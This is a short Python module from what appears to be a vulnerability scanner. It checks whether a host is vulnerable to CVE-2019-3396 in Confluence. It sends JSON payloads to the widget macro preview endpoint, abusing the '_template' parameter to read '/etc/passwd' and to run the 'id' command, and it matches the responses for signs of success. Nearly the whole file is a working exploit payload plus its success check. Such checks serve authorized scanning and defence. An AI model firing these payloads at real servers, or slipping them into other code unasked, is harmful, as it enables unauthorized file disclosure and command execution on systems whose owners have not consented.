# encoding: utf-8
'''
@Version:   V1.0
@Author:    JE2Se
@Contact:   admin@je2se.com
@Website:   https://www.je2se.com
@Github:    https://github.com/JE2Se/
@Time:  2020/6/10 17:07
@File:  Conference_CVE_2019_3396.py
@Desc: 脚本来源于工具Medusa，很好用，直接轮子过来了
'''
import requests
from lib import *
from lib.Urldeal import umethod
import logging


def Conference_CVE_2019_3396(Url):
    scheme, url, port = umethod(Url)
    data = '''{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}'''
    data2 = '''{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"id"},"body":""}}'''
    Payload = "/rest/tinymce/1/macro/preview"
    PayloadUrl = scheme + "://" + url + ':' + str(port) + Payload
    Referers = scheme + "://" + url + ':' + str(port)
    headers = {
        'Accept': 'text/plain, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json; charset=utf-8',
        'Referer': Referers,
        'Connection': 'keep-alive'
    }
    try:
        resp = requests.post(PayloadUrl, data=data,headers=headers, timeout=5)
        resp2 = requests.post(PayloadUrl, data=data2, headers=headers, timeout=5)
        con = resp.text
        con2 = resp2.text
        code = resp.status_code
        code2 = resp2.status_code
        if (code == 200 and con.lower().find('bin') != -1 and con.lower().find('root') != -1) or (code2 == 200 and con2.lower().find('uid=') != -1 and con2.lower().find('gid=') != -1):
            print(Vcolors.RED +"[!] 存在Conference路径穿越与命令执行漏洞:->CVE_2019_3396\r" + Vcolors.ENDC)
    except:
        logging.error("Conference_CVE_2019_3396脚本出现异常")
